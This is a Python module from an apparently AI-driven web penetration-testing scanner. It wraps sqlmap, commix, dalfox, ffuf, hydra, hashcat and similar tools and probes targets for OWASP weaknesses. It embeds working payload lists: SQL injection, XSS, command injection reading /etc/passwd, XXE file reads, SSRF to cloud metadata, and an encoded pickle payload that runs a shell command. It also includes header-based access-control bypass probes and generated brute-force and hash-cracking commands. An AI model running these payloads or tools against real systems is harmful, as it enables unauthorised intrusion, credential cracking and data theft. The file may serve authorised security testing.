from .base import *

class KaliToolRunner:
    def __init__(self, session: SessionContext, wl_selector: "AIWordlistSelector"):
        self.session     = session
        self.wl_selector = wl_selector

    def _cookie_str(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.session.cookies.items())

    def _auth_opts(self, tool: str) -> str:
        opts = ""
        if self.session.cookies and tool in ("sqlmap", "dalfox", "ffuf", "wfuzz"):
            c = self._cookie_str()
            opts += f' --cookie="{c}"' if tool == "sqlmap" else f" -H 'Cookie: {c}'"
        if self.session.jwt_token:
            opts += f" -H 'Authorization: Bearer {self.session.jwt_token}'"
        return opts

    def sqlmap(self, url: str, param: str, method: str = "GET",
               data: str = "", level: int = 2) -> dict:
        if not shutil.which("sqlmap"):
            return {"tool": "sqlmap", "available": False, "output": "sqlmap not found"}
        auth  = self._auth_opts("sqlmap")
        pname = param.split(":")[-1]
        base  = f"sqlmap -u '{url}' --batch --level={level} --risk=1 --timeout=10 --retries=1 --no-cast {auth}"
        cmd   = f"{base} --data='{data}' -p '{pname}'" if method == "POST" and data else f"{base} -p '{pname}'"
        r = _run_cmd(cmd, timeout=120)
        r["tool"] = "sqlmap"
        return r

    def dalfox(self, url: str, param: str = "", data: str = "", method: str = "GET") -> dict:
        if not shutil.which("dalfox"):
            return {"tool": "dalfox", "available": False, "output": "dalfox not found"}
        auth  = self._auth_opts("dalfox")
        pname = param.split(":")[-1]
        cmd   = f"dalfox url '{url}' --data '{data}' --silence {auth}" if method == "POST" and data else f"dalfox url '{url}' --silence {auth}"
        if pname:
            cmd += f" --param {pname}"
        r = _run_cmd(cmd, timeout=60)
        r["tool"] = "dalfox"
        return r

    def commix(self, url: str, param: str = "", data: str = "", method: str = "GET") -> dict:
        if not shutil.which("commix"):
            return {"tool": "commix", "available": False, "output": "commix not found"}
        auth  = self._auth_opts("commix")
        pname = param.split(":")[-1]
        cmd   = f"commix --url='{url}' --data='{data}' --batch {auth}" if method == "POST" and data else f"commix --url='{url}' --batch {auth}"
        if pname:
            cmd += f" -p {pname}"
        r = _run_cmd(cmd, timeout=90)
        r["tool"] = "commix"
        return r

    def ffuf(self, url: str, wordlist: str = "", extra_opts: str = "") -> dict:
        if not shutil.which("ffuf"):
            return {"tool": "ffuf", "available": False, "output": "ffuf not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "ffuf", "available": False, "output": "No wordlist"}
        auth = self._auth_opts("ffuf")
        cmd  = f"ffuf -u '{url}' -w '{wordlist}' -mc 200,201,301,302,403 -fs 0 -t 20 -timeout 8 -s {auth} {extra_opts}"
        r = _run_cmd(cmd, timeout=60)
        r["tool"] = "ffuf"
        return r

    def wfuzz(self, url: str, data: str = "", wordlist: str = "", hc: str = "404") -> dict:
        if not shutil.which("wfuzz"):
            return {"tool": "wfuzz", "available": False, "output": "wfuzz not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "wfuzz", "available": False, "output": "No wordlist"}
        auth = self._auth_opts("wfuzz")
        base = f"wfuzz -w '{wordlist}' --hc={hc} -t 20 {auth}"
        cmd  = f"{base} -d '{data}' '{url}'" if data else f"{base} '{url}'"
        r = _run_cmd(cmd, timeout=60)
        r["tool"] = "wfuzz"
        return r

    def nikto(self, target: str) -> dict:
        if not shutil.which("nikto"):
            return {"tool": "nikto", "available": False, "output": "nikto not found"}
        cmd = f"nikto -h '{target}' -nointeractive -timeout 10 -maxtime 120s"
        r   = _run_cmd(cmd, timeout=150)
        r["tool"] = "nikto"
        return r

    def smart_ffuf(self, base_url: str, wordlist: str,
                   profile: "SmartFuzzProfile",
                   mode: str = "dir",
                   extra_opts: str = "") -> dict:
        """
        Adaptive ffuf fuzzing based on SmartFuzzProfile.

        mode:
          "dir"   — directory/file discovery (FUZZ at end of URL)
          "param" — GET parameter discovery (url?FUZZ=val)
          "vhost" — virtual host fuzzing (Host header)

        Additional features:
          - Recursive: fuzzes inside discovered directories
          - AI verifies each discovery
          - New SmartProfile generated for each depth level
        """
        if not shutil.which("ffuf"):
            return {"tool": "smart_ffuf", "available": False, "output": "ffuf not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "smart_ffuf", "available": False, "output": f"Wordlist not found: {wordlist}"}

        auth         = self._auth_opts("ffuf")
        filter_args  = profile.ffuf_filter_args()
        base         = base_url.rstrip("/")

        if mode == "dir":
            fuzz_url = f"{base}/FUZZ"
        elif mode == "param":
            sep      = "&" if "?" in base_url else "?"
            fuzz_url = f"{base}{sep}FUZZ=pentest"
        elif mode == "vhost":
            fuzz_url = base
            auth    += f" -H 'Host: FUZZ'"
        else:
            fuzz_url = f"{base}/FUZZ"

        # ffuf JSON output via -o and -of json
        out_file = f"/tmp/ffuf_result_{hashlib.md5(base_url.encode()).hexdigest()[:8]}.json"

        cmd = (
            f"ffuf -u '{fuzz_url}' -w '{wordlist}' "
            f"-mc {','.join(str(c) for c in profile.match_codes)} "
            f"{filter_args} "
            f"-t 40 -timeout 8 "
            f"-o '{out_file}' -of json "
            f"-s "  # silent mode — hide progress bar
            f"{auth} {extra_opts}"
        )

        console.print(f"  [dim]  smart_ffuf: {fuzz_url}[/dim]")
        console.print(f"  [dim]  filters: {profile.summary()}[/dim]")
        console.print(f"  [dim]  cmd: {cmd[:120]}[/dim]")

        r = _run_cmd(cmd, timeout=120)
        r["tool"]       = "smart_ffuf"
        r["fuzz_url"]   = fuzz_url
        r["filter_args"]= filter_args
        r["out_file"]   = out_file

        # Parse results from JSON output
        r["results"] = self._parse_ffuf_json(out_file)
        console.print(
            f"  [dim]  smart_ffuf done: {len(r["results"])} hits "
            f"(filtered by: {profile.summary()})[/dim]"
        )
        return r

    def smart_gobuster(self, base_url: str, wordlist: str,
                       profile: "SmartFuzzProfile",
                       extensions: str = "php,html,js,txt,json,bak,sql,zip") -> dict:
        """
        Adaptive gobuster fuzzing based on SmartFuzzProfile.
        gobuster -x extensions + --exclude-length filter.
        """
        if not shutil.which("gobuster"):
            return {"tool": "smart_gobuster", "available": False, "output": "gobuster not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "smart_gobuster", "available": False,
                    "output": f"Wordlist not found: {wordlist}"}

        auth         = self._auth_opts("gobuster")
        filter_args  = profile.gobuster_filter_args()
        out_file     = f"/tmp/gobuster_{hashlib.md5(base_url.encode()).hexdigest()[:8]}.txt"

        cmd = (
            f"gobuster dir -u '{base_url}' -w '{wordlist}' "
            f"-x {extensions} "
            f"-t 30 --timeout 8s "
            f"{filter_args} "
            f"-o '{out_file}' "
            f"-q "  # quiet
            f"{auth}"
        )

        console.print(f"  [dim]  smart_gobuster: {base_url}[/dim]")
        console.print(f"  [dim]  filters: {profile.gobuster_filter_args()}[/dim]")

        r = _run_cmd(cmd, timeout=180)
        r["tool"]     = "smart_gobuster"
        r["out_file"] = out_file
        r["results"]  = self._parse_gobuster_txt(out_file)
        console.print(f"  [dim]  gobuster done: {len(r["results"])} hits[/dim]")
        return r

    def smart_wfuzz(self, url: str, data: str = "", wordlist: str = "",
                    profile: "SmartFuzzProfile" = None) -> dict:
        """
        Adaptive wfuzz fuzzing based on SmartFuzzProfile.
        """
        if not shutil.which("wfuzz"):
            return {"tool": "smart_wfuzz", "available": False, "output": "wfuzz not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "smart_wfuzz", "available": False, "output": "No wordlist"}

        auth         = self._auth_opts("wfuzz")
        filter_args  = profile.wfuzz_filter_args() if profile else "--hc 404"
        base         = f"wfuzz -w '{wordlist}' {filter_args} -t 30 {auth}"
        cmd          = f"{base} -d '{data}' '{url}'" if data else f"{base} '{url}'"

        console.print(f"  [dim]  smart_wfuzz: {url}[/dim]")
        console.print(f"  [dim]  filters: {filter_args}[/dim]")

        r = _run_cmd(cmd, timeout=90)
        r["tool"] = "smart_wfuzz"
        return r

    def _parse_ffuf_json(self, out_file: str) -> list:
        """Reads results from ffuf JSON output."""
        try:
            p = Path(out_file)
            if not p.exists():
                return []
            data    = json.loads(p.read_text())
            results = []
            for item in data.get("results", []):
                results.append({
                    "input":  item.get("input", {}).get("FUZZ", ""),
                    "status": item.get("status", 0),
                    "size":   item.get("length", 0),
                    "words":  item.get("words", 0),
                    "lines":  item.get("lines", 0),
                    "url":    item.get("url", ""),
                })
            return results
        except Exception as e:
            return []

    def _parse_gobuster_txt(self, out_file: str) -> list:
        """Reads results from gobuster text output."""
        try:
            p = Path(out_file)
            if not p.exists():
                return []
            results = []
            for line in p.read_text().splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Format: /path (Status: 200) [Size: 1234]
                m_path   = re.match(r'^(/\S+)', line)
                m_status = re.search(r'Status:\s*(\d+)', line)
                m_size   = re.search(r'Size:\s*(\d+)', line)
                if m_path:
                    results.append({
                        "input":  m_path.group(1),
                        "status": int(m_status.group(1)) if m_status else 0,
                        "size":   int(m_size.group(1)) if m_size else 0,
                        "words":  0,
                        "lines":  0,
                        "url":    "",
                    })
            return results
        except Exception:
            return []

class OWASPFuzzEngine:
    """
    Selects the correct Kali tool for each endpoint × parameter.
    Dynamically selects wordlists via AIWordlistSelector:
      - Site technology (PHP, Java, Python, Node.js)
      - Parameter name and type (file, id, url, cmd)
      - Server header
    If no wordlist found on system — uses built-in fallback.
    """

    OWASP_TOOL_MAP = {
        "A01_access_control": {
            "tools": ["ffuf_idor", "method_switch", "auth_header_test"],
            "params": ["query", "path", "header"],
        },
        "A02_crypto": {
            "tools": ["ssl_check", "header_check"],
            "params": ["header"],
        },
        "A03_sqli": {
            "tools": ["sqlmap"],
            "params": ["query", "body", "json", "hidden"],
        },
        "A03_xss": {
            "tools": ["dalfox"],
            "params": ["query", "body", "json", "hidden"],
        },
        "A03_cmdi": {
            "tools": ["commix"],
            "params": ["query", "body"],
        },
        "A03_lfi": {
            "tools": ["ffuf_lfi"],
            "params": ["query", "body", "path"],
        },
        "A03_ssti": {
            "tools": ["wfuzz_ssti"],
            "params": ["query", "body"],
        },
        "A03_xxe": {
            "tools": ["xxe_probe"],
            "params": ["body", "json", "xml"],
        },
        "A04_rate_limit": {
            "tools": ["rate_check"],
            "params": ["query", "body"],
        },
        "A05_misconfig": {
            "tools": ["nikto", "header_check"],
            "params": [],
        },
        "A07_auth": {
            "tools": ["hydra_probe", "jwt_check"],
            "params": ["header", "cookie"],
        },
        "A08_deser": {
            "tools": ["deser_probe"],
            "params": ["body", "json", "cookie", "header"],
        },
        "A10_ssrf": {
            "tools": ["ffuf_ssrf"],
            "params": ["query", "body", "json"],
        },
    }

    # Built-in fallback payloads — only used when no wordlist found on system
    SQLI_QUICK = [
        "'", "''", "1'--", "1 OR 1=1--", "admin'--",
        "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--",
    ]
    XSS_QUICK = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "{{7*7}}", "${7*7}",
    ]
    LFI_QUICK = [
        "../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd", "....//....//etc/passwd",
    ]
    SSRF_QUICK = [
        "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/", "file:///etc/passwd",
    ]
    CMDI_QUICK = [
        "; id", "| id", "$(id)", "%0aid",
        "; sleep 5", "| sleep 5", "$(sleep 5)",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "|| id", "&& id", "\nid\n",
    ]
    SSTI_QUICK = [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{config}}", "{% debug %}",
    ]
    XXE_QUICK = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    ]
    DESER_QUICK_JAVA = [
        # Java ysoserial CommonsCollections marker (rO0AB — base64 serialized)
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAdA",
    ]
    DESER_QUICK_PYTHON = [
        # Python pickle payload (base64-encoded cos\nsystem\n(S'id'\ntR.)
        "Y29zCnN5c3RlbQooUydpZCcKdFIu",
    ]
    DESER_QUICK_PHP = [
        'O:8:"stdClass":1:{s:4:"test";s:2:"id";}',
        'a:1:{s:4:"test";s:4:"ls -la";}',
    ]

    def __init__(self, client: HTTPClient, baseline: BaselineEngine,
                 kali: KaliToolRunner, ai: AIEngine,
                 wl_selector: "AIWordlistSelector",
                 site_tech: dict = None):
        self.client      = client
        self.baseline    = baseline
        self.kali        = kali
        self.ai          = ai
        self.wl_selector = wl_selector
        self.site_tech   = site_tech or {}
        self.findings    : list[Finding] = []
        self.signals     : list[dict]    = []
        self._lock       = threading.Lock()

    def _build_wl_context(self, ep: Endpoint, param_key: str, category: str) -> dict:
        """
        Collect context for wordlist selection.
        Includes URL, parameter name, technology, server.
        """
        param_name = param_key.split(":")[-1].lower()

        # Determine parameter type heuristically
        param_type = "generic"
        if any(k in param_name for k in ["file","path","dir","include","load","read","open"]):
            param_type = "file"
        elif any(k in param_name for k in ["url","redirect","next","return","dest","host","src"]):
            param_type = "url"
        elif any(k in param_name for k in ["cmd","exec","command","run","shell","system","ping"]):
            param_type = "cmd"
        elif any(k in param_name for k in ["id","user_id","uid","pid","oid","record"]):
            param_type = "id"
        elif any(k in param_name for k in ["query","search","q","keyword","find","filter"]):
            param_type = "search"
        elif any(k in param_name for k in ["template","tpl","view","layout","theme"]):
            param_type = "template"

        return {
            "url":         ep.url,
            "param":       param_key,
            "tech":        self.site_tech.get("lang", "unknown"),
            "framework":   self.site_tech.get("framework", "unknown"),
            "server":      self.site_tech.get("server", "unknown"),
            "cms":         self.site_tech.get("cms", "unknown"),
            "param_type":  param_type,
            "param_name":  param_name,
            "page_title":  "",
            "category":    category,
        }

    def test_endpoint(self, ep: Endpoint) -> list[Finding]:
        base_fp  = self.baseline.get(ep)
        results  = []
        for check_id, cfg in self.OWASP_TOOL_MAP.items():
            relevant_params = self._get_relevant_params(ep, cfg["params"])
            for param_key in relevant_params[:8]:
                param_name = param_key.split(":")[-1]
                for tool_name in cfg["tools"]:
                    finding = self._run_tool(check_id, tool_name, ep, param_key, param_name, base_fp)
                    if finding:
                        results.append(finding)
        return results

    def _run_tool(self, check_id: str, tool_name: str,
                  ep: Endpoint, param_key: str, param_name: str,
                  base_fp: BaselineFingerprint) -> Optional[Finding]:

        tool_out = {"tool": tool_name, "output": "", "available": True}

        if tool_name == "sqlmap" and check_id == "A03_sqli":
            clean_params = {
                k.split(":")[-1]: v
                for k, v in ep.params.items()
                if not k.startswith("header:") and not k.startswith("path:")
            }
            if ep.method == "POST":
                data = urllib.parse.urlencode(clean_params) if clean_params else ""
                tool_out = self.kali.sqlmap(ep.url, param_key, ep.method, data)
            else:
                pname = param_key.split(":")[-1]
                parsed = urllib.parse.urlparse(ep.url)
                qs = dict(urllib.parse.parse_qsl(parsed.query))
                if pname and pname not in qs:
                    qs[pname] = str(clean_params.get(pname, "1"))
                target_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
                tool_out = self.kali.sqlmap(target_url, param_key, "GET", "")

        elif tool_name == "dalfox" and check_id == "A03_xss":
            data = urllib.parse.urlencode(ep.params) if ep.method == "POST" else ""
            tool_out = self.kali.dalfox(ep.url, param_key, data, ep.method)

        elif tool_name == "commix" and check_id == "A03_cmdi":
            data = urllib.parse.urlencode(ep.params) if ep.method == "POST" else ""
            tool_out = self.kali.commix(ep.url, param_key, data, ep.method)

        elif tool_name == "ffuf_lfi":
            # AI selects LFI wordlist based on site technology
            ctx = self._build_wl_context(ep, param_key, "lfi")
            wl  = self.wl_selector.select("lfi", ctx)
            fuzz_url = self._inject_fuzz(ep.url, param_key, "FUZZ")
            tool_out = self.kali.ffuf(fuzz_url, wl)

        elif tool_name == "ffuf_ssrf":
            # AI selects SSRF wordlist based on URL parameter
            ctx = self._build_wl_context(ep, param_key, "ssrf")
            wl  = self.wl_selector.select("ssrf", ctx)
            fuzz_url = self._inject_fuzz(ep.url, param_key, "FUZZ")
            tool_out = self.kali.ffuf(fuzz_url, wl)

        elif tool_name == "ffuf_idor":
            return self._idor_probe(ep, param_key, base_fp)

        elif tool_name == "method_switch":
            return self._method_switch_probe(ep, base_fp)

        elif tool_name == "auth_header_test":
            return self._auth_header_probe(ep, param_key, base_fp)

        elif tool_name == "nikto":
            tool_out = self.kali.nikto(ep.url)

        elif tool_name == "header_check":
            return self._header_security_check(ep, base_fp)

        elif tool_name == "rate_check":
            return self._rate_limit_check(ep)

        elif tool_name == "jwt_check":
            return self._jwt_analysis(ep)

        elif tool_name == "ssl_check":
            return self._ssl_check(ep)

        elif tool_name == "wfuzz_ssti":
            # AI identifies template engine type from site appearance
            ctx = self._build_wl_context(ep, param_key, "ssti")
            wl  = self.wl_selector.select("ssti", ctx)
            data = urllib.parse.urlencode({param_name: "FUZZ"}) if ep.method == "POST" else ""
            tool_out = self.kali.wfuzz(
                self._inject_fuzz(ep.url, param_key, "FUZZ"),
                data, wl
            )

        elif tool_name == "xxe_probe":
            return self._xxe_probe(ep, param_key, param_name, base_fp)

        elif tool_name == "deser_probe":
            return self._deser_probe(ep, param_key, param_name, base_fp)

        else:
            return None

        if not tool_out.get("available", True):
            return None

        # Quick payloads direct fuzz
        payloads    = self._get_quick_payloads(check_id)
        best_resp   = None
        best_diff   = {}
        best_payload = ""
        for payload in payloads[:5]:
            fuzz_resp = self._fuzz_request(ep, param_key, param_name, payload)
            diff      = self.baseline.diff(base_fp, fuzz_resp, fuzz_resp.get("timing", 0))
            if self._diff_is_interesting(diff):
                best_resp    = fuzz_resp
                best_diff    = diff
                best_payload = payload
                break

        if best_resp is None and not tool_out.get("output"):
            return None

        resp_for_ai = best_resp or {}
        context = {
            "url":             ep.url,
            "method":          ep.method,
            "param":           param_key,
            "payload":         best_payload,
            "tool":            tool_name,
            "baseline_status": base_fp.status,
            "baseline_size":   base_fp.body_len,
            "baseline_timing": base_fp.timing_avg,
            "baseline_title":  base_fp.title,
            "fuzz_status":     resp_for_ai.get("status", 0),
            "fuzz_size":       len(resp_for_ai.get("body", "")),
            "fuzz_timing":     resp_for_ai.get("timing", 0),
            "size_diff":       best_diff.get("size_diff", 0),
            "size_pct":        best_diff.get("size_pct", 0),
            "time_anomaly":    best_diff.get("time_anomaly", False),
            "new_errors":      best_diff.get("new_errors", []),
            "status_changed":  best_diff.get("status_changed", False),
            "body_snippet":    resp_for_ai.get("body", "")[:500],
            "tool_output":     tool_out.get("output", "")[:800],
        }

        ai_result = self.ai.classify_finding(context)
        if not ai_result or not ai_result.get("found"):
            if ai_result and ai_result.get("confidence", 0) > 20:
                self.signals.append({**context, "ai": ai_result})
            return None

        confidence = ai_result.get("confidence", 50)
        if confidence < MIN_CONFIDENCE:
            return None

        if best_diff:
            diff_str = json.dumps(best_diff, default=str)[:300]
        elif tool_out.get("output"):
            diff_str = json.dumps({
                "tool_only_signal": tool_name,
                "fuzz_status": resp_for_ai.get("status", 0),
                "fuzz_size": len(resp_for_ai.get("body", "")),
            }, default=str)[:300]
        else:
            diff_str = ""
        f = Finding(
            owasp_id     = ai_result.get("owasp_id", check_id[:3].upper()),
            owasp_name   = ai_result.get("owasp_name", check_id),
            title        = ai_result.get("title", ""),
            risk         = ai_result.get("risk", "Medium"),
            confidence   = confidence,
            url          = ep.url,
            method       = ep.method,
            param        = param_key,
            payload      = best_payload,
            evidence     = ai_result.get("evidence", "") or tool_out.get("output", "")[:220],
            baseline_diff= diff_str,
            tool_output  = tool_out.get("output", "")[:500],
            request_raw  = self._build_request_str(ep, param_key, best_payload),
            response_raw = (resp_for_ai.get("body", "")[:600] if resp_for_ai else ""),
            exploit_cmd  = ai_result.get("exploit_cmd", ""),
            remediation  = ai_result.get("remediation", ""),
        )
        with self._lock:
            self.findings.append(f)
        self._print_finding(f)
        return f

    # ── Specialized probes ────────────────────────────────────────────────
    def _idor_probe(self, ep: Endpoint, param_key: str,
                    base_fp: BaselineFingerprint) -> Optional[Finding]:
        pname  = param_key.split(":")[-1]
        orig   = ep.params.get(param_key, "1")
        if not str(orig).isdigit():
            return None
        for delta in [1, -1, 2, 999, 0]:
            test_val  = str(int(orig) + delta) if delta != 999 else "999999"
            resp = self.client.get(self._rebuild_url(ep.url, pname, test_val))
            diff = self.baseline.diff(base_fp, resp, resp.get("timing", 0))
            if diff.get("status_changed") or diff.get("size_pct", 0) > 15:
                context = {
                    "url": ep.url, "method": "GET", "param": param_key,
                    "payload": f"id={test_val} (IDOR attempt)", "tool": "idor_probe",
                    "baseline_status": base_fp.status, "baseline_size": base_fp.body_len,
                    "baseline_timing": base_fp.timing_avg, "baseline_title": base_fp.title,
                    "fuzz_status": resp.get("status"), "fuzz_size": len(resp.get("body","")),
                    "fuzz_timing": resp.get("timing", 0), "size_diff": diff["size_diff"],
                    "size_pct": diff["size_pct"], "time_anomaly": False,
                    "new_errors": diff.get("new_errors", []), "status_changed": diff["status_changed"],
                    "body_snippet": resp.get("body","")[:500],
                    "tool_output": f"ID {orig} vs {test_val}: size diff {diff['size_diff']}",
                }
                ai_r = self.ai.classify_finding(context)
                if ai_r and ai_r.get("found") and ai_r.get("confidence", 0) >= MIN_CONFIDENCE:
                    return Finding(
                        owasp_id="A01", owasp_name="Broken Access Control",
                        title=ai_r.get("title","Possible IDOR"),
                        risk=ai_r.get("risk","Medium"), confidence=ai_r.get("confidence",50),
                        url=ep.url, method="GET", param=param_key,
                        payload=test_val, evidence=ai_r.get("evidence",""),
                        baseline_diff=json.dumps(diff)[:200], tool_output="",
                        request_raw=f"GET {ep.url}?{pname}={test_val}",
                        response_raw=resp.get("body","")[:400],
                        exploit_cmd=ai_r.get("exploit_cmd",""),
                        remediation=ai_r.get("remediation",""),
                    )
        return None

    def _method_switch_probe(self, ep: Endpoint,
                             base_fp: BaselineFingerprint) -> Optional[Finding]:
        # OPTIONS and HEAD — standard HTTP methods, not bypass
        for method in ["PUT", "DELETE", "PATCH", "TRACE"]:
            r = self.client._request(ep.url, method)
            if r["status"] not in (405, 501, 0) and r["status"] != base_fp.status:
                body = r.get("body", "")
                # Empty response or very small body — exploitation not proven
                if len(body.strip()) < 50:
                    continue
                # Returns 200 but body is similar — only status differs, not actual BAC
                if r["status"] == 200:
                    sens = RiskScorer.score_body(body)
                    if not sens:
                        continue  # No sensitive data found
                return Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"HTTP Method {method} accepted unexpectedly",
                    risk="Medium", confidence=55,
                    url=ep.url, method=method, param="HTTP_METHOD",
                    payload=method, evidence=f"Status {r['status']} for {method}, body size: {len(body)}",
                    baseline_diff=f"Baseline: {base_fp.status}, {method}: {r['status']}",
                    tool_output="", request_raw=f"{method} {ep.url}",
                    response_raw=body[:2000],
                    exploit_cmd=f"curl -X {method} '{ep.url}'",
                    remediation="Restrict allowed HTTP methods.",
                )
        return None

    def _auth_header_probe(self, ep: Endpoint, param_key: str,
                           base_fp: BaselineFingerprint) -> Optional[Finding]:
        bypass_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Original-URL":  "/admin",
            "X-Rewrite-URL":   "/admin",
        }
        # First get the page with a normal GET — baseline body
        clean_resp = self.client.get(ep.url)
        clean_body = clean_resp.get("body", "")
        clean_hash = hashlib.md5(clean_body.encode()).hexdigest()

        for h, v in bypass_headers.items():
            r    = self.client.get(ep.url, extra_headers={h: v})
            diff = self.baseline.diff(base_fp, r, r.get("timing", 0))
            if diff.get("status_changed") and r["status"] == 200 and base_fp.status in (401, 403):
                bypass_body = r.get("body", "")
                bypass_hash = hashlib.md5(bypass_body.encode()).hexdigest()

                # If response body is the same as the public version of the page
                # (e.g. login page) — this is not BAC, just the public page returned
                if bypass_hash == clean_hash:
                    continue
                # If body size is very close and title is the same — this is a public page
                if (abs(len(bypass_body) - len(clean_body)) < 100 and
                    diff.get("new_title") == self.baseline._extract_title(clean_body)):
                    continue

                # Check for sensitive data
                sens_keys = RiskScorer.score_body(bypass_body)
                has_sensitive = bool(sens_keys)
                # If login form detected and no other sensitive data — FP
                is_login_page = any(k in bypass_body.lower() for k in
                    ["<input", "password", "login", "sign in", "log in"])
                if is_login_page and not has_sensitive:
                    continue

                conf = 85 if has_sensitive else 60
                return Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"Access Control Bypass via {h} header",
                    risk="High", confidence=conf,
                    url=ep.url, method="GET", param=f"header:{h}",
                    payload=v,
                    evidence=(
                        f"With {h}: {v}, status {base_fp.status}→200. "
                        f"Response differs from baseline (size: {len(clean_body)}→{len(bypass_body)}). "
                        f"Sensitive data: {[s['key'] for s in sens_keys[:5]]}" if has_sensitive
                        else f"With {h}: {v}, status {base_fp.status}→200. Response body differs from public page."
                    ),
                    baseline_diff=diff.get("status_diff",""), tool_output="",
                    request_raw=f"GET {ep.url}\n{h}: {v}",
                    response_raw=r.get("body","")[:2000],
                    exploit_cmd=f"curl -H '{h}: {v}' '{ep.url}'",
                    remediation=f"Do not use {h} for access control.",
                )
        return None

    def _header_security_check(self, ep: Endpoint,
                               base_fp: BaselineFingerprint) -> Optional[Finding]:
        r = self.client.get(ep.url)
        missing = []
        required = {
            "strict-transport-security": ("Medium", "HSTS missing"),
            "content-security-policy":   ("High",   "No CSP"),
            "x-frame-options":           ("Medium", "Clickjacking possible"),
            "x-content-type-options":    ("Low",    "MIME sniffing possible"),
            "referrer-policy":           ("Low",    "Referrer leakage"),
        }
        hdrs_lower = {k.lower(): v for k, v in r.get("headers", {}).items()}
        for h, (risk, desc) in required.items():
            if h not in hdrs_lower:
                missing.append({"header": h, "risk": risk, "desc": desc})
        cors = hdrs_lower.get("access-control-allow-origin", "")
        if cors == "*":
            missing.append({"header": "CORS wildcard", "risk": "High", "desc": "Wildcard CORS"})
        if not missing:
            return None
        worst_risk = "High" if any(m["risk"]=="High" for m in missing) else "Medium"
        return Finding(
            owasp_id="A05", owasp_name="Security Misconfiguration",
            title=f"Missing security headers ({len(missing)} issues)",
            risk=worst_risk, confidence=90,
            url=ep.url, method="GET", param="HTTP_HEADERS", payload="",
            evidence="; ".join(f"{m['header']}: {m['desc']}" for m in missing[:3]),
            baseline_diff="", tool_output="",
            request_raw=f"GET {ep.url}",
            response_raw="\n".join(f"{k}: {v}" for k,v in list(r.get("headers",{}).items())[:15]),
            exploit_cmd="",
            remediation="Add missing security headers to all responses.",
        )

    def _rate_limit_check(self, ep: Endpoint) -> Optional[Finding]:
        if not any(k in ep.url.lower() for k in ["/login", "/auth", "/signup", "/reset"]):
            return None
        statuses = []
        for _ in range(15):
            r = self.client.post(ep.url, data={"username": "test", "password": "wrongpass"})
            statuses.append(r["status"])
            time.sleep(0.1)
        if 429 not in statuses and 403 not in statuses:
            return Finding(
                owasp_id="A04", owasp_name="Insecure Design",
                title="No rate limiting on authentication endpoint",
                risk="High", confidence=80,
                url=ep.url, method="POST", param="rate_limit",
                payload="15 rapid requests",
                evidence=f"15 requests returned {set(statuses)} — no 429/block",
                baseline_diff="", tool_output=f"Statuses: {statuses}",
                request_raw=f"POST {ep.url} (×15)",
                response_raw=f"Status codes: {statuses}",
                exploit_cmd=f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {urllib.parse.urlparse(ep.url).netloc} http-post-form",
                remediation="Implement rate limiting / CAPTCHA on auth endpoints.",
            )
        return None

    def _jwt_analysis(self, ep: Endpoint) -> Optional[Finding]:
        jwt = self.client.session.jwt_token
        if not jwt:
            return None
        parts = jwt.split(".")
        if len(parts) < 2:
            return None
        try:
            hdr = json.loads(base64.b64decode(parts[0] + "==").decode("utf-8", errors="ignore"))
            alg = hdr.get("alg", "").upper()
            if alg in ("NONE", ""):
                return Finding(
                    owasp_id="A07", owasp_name="Identification and Authentication Failures",
                    title="JWT Algorithm: none — signature bypass",
                    risk="Critical", confidence=95,
                    url=ep.url, method="GET", param="header:Authorization",
                    payload=jwt[:40] + "...",
                    evidence=f"JWT algorithm is '{alg}' — no signature verification",
                    baseline_diff="", tool_output="",
                    request_raw=f"Authorization: Bearer {jwt[:60]}...", response_raw="",
                    exploit_cmd="python3 -c \"import base64,json; ...\"",
                    remediation="Never accept JWT with alg:none. Use RS256/ES256.",
                )
            if alg in ("HS256", "HS384", "HS512"):
                return Finding(
                    owasp_id="A07", owasp_name="Identification and Authentication Failures",
                    title=f"JWT uses symmetric {alg} — brute-forceable",
                    risk="Medium", confidence=65,
                    url=ep.url, method="GET", param="header:Authorization",
                    payload=alg,
                    evidence=f"Symmetric JWT ({alg}): secret can be brute-forced offline",
                    baseline_diff="", tool_output="",
                    request_raw=f"Authorization: Bearer {jwt[:60]}...", response_raw="",
                    exploit_cmd=f"hashcat -a 0 -m 16500 '{jwt}' /usr/share/wordlists/rockyou.txt",
                    remediation="Use asymmetric algorithms (RS256, ES256) for JWT signing.",
                )
        except Exception:
            pass
        return None

    def _ssl_check(self, ep: Endpoint) -> Optional[Finding]:
        host = urllib.parse.urlparse(ep.url).netloc.split(":")[0]
        if shutil.which("nmap"):
            r = _run_cmd(f"nmap -p 443 --script ssl-enum-ciphers,ssl-cert {host} -T4 --open", timeout=30)
            output = r.get("output", "")
            issues = []
            if "SSLv3" in output:   issues.append("SSLv3 enabled (POODLE)")
